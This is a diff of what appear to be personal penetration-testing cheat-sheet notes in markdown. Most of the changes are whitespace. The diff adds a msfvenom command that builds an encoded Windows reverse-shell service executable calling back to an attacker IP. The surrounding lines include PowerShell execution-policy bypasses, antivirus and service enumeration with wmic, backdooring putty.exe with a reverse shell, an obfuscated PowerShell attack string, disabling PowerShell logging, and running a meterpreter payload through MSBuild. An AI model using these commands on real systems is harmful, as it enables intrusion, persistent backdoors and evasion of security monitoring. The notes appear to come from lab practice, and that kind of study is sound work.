@@ -156,8 +156,6 @@
 
 - [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)
 
-
-
 # Commands
 - powershell -exec bypass
 - powershell -ep bypass
@@ -169,7 +167,7 @@
   - wmic service where "name like 'name'" get Name,Version,Pathname
   - **wmic** find users || dir /p datei.txt (find file) = find file
   - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
-  - - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
     - find services not in folder c:\windows
     - find services without quotation marks
     - account for the service: sc qc SERVICE_NAME ==>local syste?
@@ -307,6 +305,7 @@
 ### Backdoor
 - find executables and "batizar"
   - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
+  - msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 - shortcut
   - point the shortcut to payload
 
@@ -637,7 +636,6 @@ full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.t
 ```
 
 # Evade Logging
-
 - Methodology
   - disable logging (1)
   - keep integrity (2)
@@ -767,8 +765,6 @@ $snap.LogPipelineExecutionDetails = $false
   - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
   - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
   - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
-
-
 
 # Bypass Applocker
 - Applocker: restrict programs from being executed
